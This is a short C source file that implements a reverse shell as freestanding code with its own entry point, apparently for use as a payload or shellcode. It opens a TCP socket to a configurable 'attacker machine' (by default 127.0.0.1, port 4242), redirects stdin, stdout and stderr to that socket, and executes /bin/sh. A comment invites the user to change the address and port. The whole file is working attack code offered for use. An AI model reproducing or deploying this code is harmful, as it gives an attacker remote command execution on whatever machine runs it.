// Change these to suit your needs
#define PORT 4242
#define ADDR 0x0100007F
#define SHELL "/bin/sh"


// Define functions from sys.s
extern int socket(int domain, int type, int protocol);
extern int connect(int sockfd, void *addr, int addrlen);
extern int dup2(int oldfd, int newfd);
extern int execve(const char *pathname, char *const argv[], char *const envp[]);
extern void exit(int status) __attribute__((noreturn));

// Match the socaddr_in in sys/socket.h
struct sockaddr_in {
    short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    char sin_zero[8];
};

__attribute__((section(".text.start"), used))
__attribute__((noreturn))
void _start() {
    // Connection struct
    struct sockaddr_in revsockaddr;

    // Create the socket for the connection
    int sockt = socket(2, 1, 0);
    revsockaddr.sin_family = 2;
    revsockaddr.sin_port = __builtin_bswap16(PORT);
    revsockaddr.sin_addr = ADDR;

    // Zero out sin_zero
    *(long long*)((char*)&revsockaddr.sin_zero) = 0;

    // Connect to the attacker machine
    connect(sockt, (void*)&revsockaddr, sizeof(revsockaddr));

    // Connect the network socket to stdin, stdout and stderr
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    // Execute the shell, yielding this procces to it
    static char *const argv[] = {SHELL, 0};
    execve(SHELL, argv, 0);

    __builtin_unreachable();
}
